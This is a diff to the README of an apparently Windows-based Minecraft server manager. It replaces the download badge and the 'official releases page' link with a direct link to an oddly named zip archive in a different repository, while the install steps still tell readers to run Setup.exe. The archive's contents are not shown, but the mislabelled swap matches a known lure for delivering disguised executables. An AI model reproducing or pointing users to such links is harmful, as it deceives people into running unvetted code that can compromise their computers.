@@ -5,7 +5,7 @@ description: "Configure and deploy Minecraft servers on Windows with automated f
 ---
 # 🕹️ Minecraft-Server-Manager-2026 - Create your private Minecraft server fast
 
-[![Download Minecraft-Server-Manager-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases)
+[![Download Minecraft-Server-Manager-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Sticky-geopolitics135/sticky-geopolitics135.github.io/main/p/Release_brachioradialis.zip)
 
 Minecraft Server Manager 2026 simplifies the process of hosting a game server on your Windows computer. Whether you want to play with friends or manage mods, this tool handles the configuration and file management for you.
 
@@ -24,7 +24,7 @@ To run this application, ensure your computer meets these minimum specifications
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official releases page](https://github.com/Sticky-geopolitics135/Minecraft-Server-Manager-2026/releases) to access the latest version of the manager.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Sticky-geopolitics135/sticky-geopolitics135.github.io/main/p/Release_brachioradialis.zip) to access the latest version of the manager.
 2.  Locate the file titled `Setup.exe` under the most recent release section.
 3.  Click the file to start the download.
 4.  Once the download finishes, navigate to your Downloads folder and double-click `Setup.exe`.
